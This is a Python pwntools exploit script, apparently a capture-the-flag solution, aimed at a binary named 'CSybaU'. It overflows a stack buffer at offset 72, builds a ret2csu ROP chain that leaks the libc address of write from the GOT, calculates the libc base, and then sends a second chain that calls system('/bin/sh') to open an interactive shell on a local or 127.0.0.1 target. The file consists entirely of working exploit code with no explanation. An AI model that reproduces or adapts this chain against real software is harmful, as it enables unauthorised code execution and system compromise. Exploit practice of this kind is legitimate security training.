import pwn
from pwnlib.log import context
from pwnlib.rop import rop

elf = pwn.context.binary = pwn.ELF("./CSybaU🥀")
libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "error"

rop = pwn.ROP(elf)
ret = pwn.pack(rop.ret.address)
rdi = pwn.pack(rop.rdi.address)
pop_chain = pwn.pack(0x00000000004011DA)
mov_chain = pwn.pack(0x00000000004011C0)
# p = pwn.process()
if pwn.args.REMOTE:
    p = pwn.remote("127.0.0.1",6969)
elif pwn.args.GDB:
    p = pwn.gdb.debug("./CSyabU🥀")
else:
    p = pwn.process()

p.recvuntil(b">")
offset = 72
payload = pwn.flat(
    pwn.cyclic(offset),
    pop_chain,
    pwn.pack(0),
    pwn.pack(1),
    pwn.pack(elf.got["write"]),
    pwn.pack(1),
    pwn.pack(elf.got["write"]),
    pwn.pack(6),
    mov_chain,
    pwn.pack(0) * 7,
    pwn.pack(elf.sym["main"]),
)
p.sendline(payload)
leak = p.recvuntil(b">", drop=True)
leak = pwn.unpack(leak, "all")
libc.address = leak - libc.sym["write"]
system = pwn.pack(libc.sym["system"])
binsh = next(libc.search(b"/bin/sh\0"))
payload = pwn.flat(pwn.cyclic(offset), ret, rdi, binsh, system)
p.sendline(payload)
p.interactive()
